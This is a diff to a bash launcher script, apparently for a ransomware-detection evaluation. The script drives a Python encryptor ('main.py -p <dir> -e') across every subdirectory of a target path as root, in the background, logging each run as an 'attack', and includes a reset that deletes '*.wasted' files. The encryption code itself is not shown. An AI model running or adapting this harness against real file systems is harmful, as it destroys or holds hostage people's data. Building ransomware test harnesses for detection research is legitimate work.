@@ -13,11 +13,11 @@ REAL_USER=${SUDO_USER:-$USER}
 cleanup() {
     trap - SIGINT SIGTERM EXIT
     echo -e "\n\033[0;31m🚨 NOT-AUS: Stoppe alle Prozesse...\033[0m"
+    # Stoppe alle Python main.py Prozesse (auch die von root)
+    pkill -9 -f "main.py.*-p.*-e" 2>/dev/null
+    # Stoppe alle Jobs dieses Skripts
     jobs -p | xargs -r kill -9 2>/dev/null
-    sudo -u "$REAL_USER" pkill -9 -f "main.py" 2>/dev/null
-    pkill -9 -f "main.py" 2>/dev/null
     pkill -9 -P $$ 2>/dev/null
-    kill -9 -$$ 2>/dev/null
     exit 130
 }
 trap cleanup SIGINT SIGTERM EXIT
@@ -49,7 +49,7 @@ do_setup() {
 }
 
 # -----------------------------------------------------------------
-# 2. RUN-FUNKTION (Mit Fehler-Analyse)
+# 2. RUN-FUNKTION (Mit automatischem Setup)
 # -----------------------------------------------------------------
 do_run() {
     TARGET=$1
@@ -59,45 +59,74 @@ do_run() {
         echo "Benutzung: ./run_jimmy_ransomware.sh run [Pfad] [Sekunden]"; exit 1
     fi
 
+    # Automatisches Setup, falls venv nicht existiert
     if [ ! -d "$VENV_DIR" ]; then
-        echo -e "\033[0;31m[FEHLER] venv nicht gefunden. Bitte führe zuerst 'setup' aus!\033[0m"
-        exit 1
+        echo -e "\033[0;33m[INFO] venv nicht gefunden. Führe automatisch Setup aus...\033[0m"
+        do_setup
+        echo -e "\033[0;32m[INFO] Setup abgeschlossen. Starte Ransomware...\033[0m"
     fi
 
     mapfile -t SUBDIRS < <(find "$TARGET" -type d 2>/dev/null)
+    
     echo -e "\033[0;32m=== DETECTIVE MODE GESTARTET (Dauer: ${DURATION}s) ===\033[0m"
+    echo -e "\033[0;33m[DEBUG] Gefundene Verzeichnisse: ${#SUBDIRS[@]}\033[0m"
+    echo -e "\033[0;33m[DEBUG] Dateien: $(find "$TARGET" -type f 2>/dev/null | wc -l)\033[0m"
+    
+    if [ ${#SUBDIRS[@]} -eq 0 ] || [ ${#SUBDIRS[@]} -eq 1 ]; then
+        echo -e "\033[0;31m[WARNUNG] Nur 1 Verzeichnis gefunden. Berechtigungsproblem bei find?\033[0m"
+        echo -e "\033[0;33m[INFO] Verwende Hauptverzeichnis direkt...\033[0m"
+        SUBDIRS=("$TARGET")
+    fi
 
     END_TIME=$((SECONDS + DURATION))
 
+    # Starte Verschlüsselung asynchron im Hintergrund
+    ATTACK_COUNT=0
     while [ $SECONDS -lt $END_TIME ]; do
         for SUBDIR in "${SUBDIRS[@]}"; do
             if [ $SECONDS -ge $END_TIME ]; then break 2; fi
 
-            echo -n -e "\033[0;34m[TEST]\033[0m Greife an: $SUBDIR ... "
+            ATTACK_COUNT=$((ATTACK_COUNT + 1))
+            echo -e "\033[0;34m[ANGRIFF #$ATTACK_COUNT]\033[0m $SUBDIR"
             
-            # Führe Python aus und fange ALLE Ausgaben (Fehler & Normal) ab
-            ERROR_LOG=$(sudo -u "$REAL_USER" "$VENV_DIR/bin/python3" "$INSTALL_DIR/main.py" -p "$SUBDIR" -e 2>&1)
-            EXIT_STATUS=$?
-
-            if [ $EXIT_STATUS -eq 0 ]; then
-                echo -e "\033[0;32m[ERFOLG]\033[0m"
+            # Starte Python im Hintergrund als root (volle Berechtigungen für NFS)
+            "$VENV_DIR/bin/python3" "$INSTALL_DIR/main.py" -p "$SUBDIR" -e &>/dev/null &
+            LAST_PID=$!
+            
+            # Debug: Prüfe ob Prozess läuft
+            sleep 0.1
+            if ps -p $LAST_PID > /dev/null 2>&1; then
+                echo -e "  \033[0;32m✓ Prozess $LAST_PID läuft\033[0m"
             else
-                echo -e "\033[0;31m[FEHLGESCHLAGEN (Code: $EXIT_STATUS)]\033[0m"
-                echo -e "\033[0;33m--- PYTHON FEHLERMELDUNG ---\033[0m"
-                echo "$ERROR_LOG"
-                echo -e "\033[0;33m----------------------------\033[0m"
+                echo -e "  \033[0;31m✗ Prozess $LAST_PID beendet (Fehler?)\033[0m"
             fi
+            
+            # Kurze Pause zwischen Angriffen
+            sleep 0.3
         done
         sleep 0.5
     done
+    
+    echo -e "\n\033[0;33m[INFO] Warte auf Ende ($END_TIME - $SECONDS = $((END_TIME - SECONDS))s)...\033[0m"
+    
+    # Warte bis zur END_TIME
+    sleep $((END_TIME - SECONDS))
 }
 
 # -----------------------------------------------------------------
 # AUSWAHLMENÜ
 # -----------------------------------------------------------------
+# Wenn nur 2 Parameter (ohne Kommando), dann automatisch "run" annehmen
+if [[ $# -eq 2 && "$1" != "setup" && "$1" != "reset" ]]; then
+    # Automatischer Run-Modus für Evaluation-Script Kompatibilität
+    do_run "$1" "$2"
+    exit $?
+fi
+
 case "$1" in
     setup) do_setup ;;
     run)   do_run "$2" "$3" ;;
     reset) find "$2" -name "*.wasted" -type f -delete 2>/dev/null ;;
-    *)     echo "Befehle: setup | run | reset" ;;
+    *)     echo "Befehle: setup | run <pfad> <sekunden> | reset <pfad>"
+           echo "Oder direkt: $0 <pfad> <sekunden> (automatischer Run-Modus)" ;;
 esac
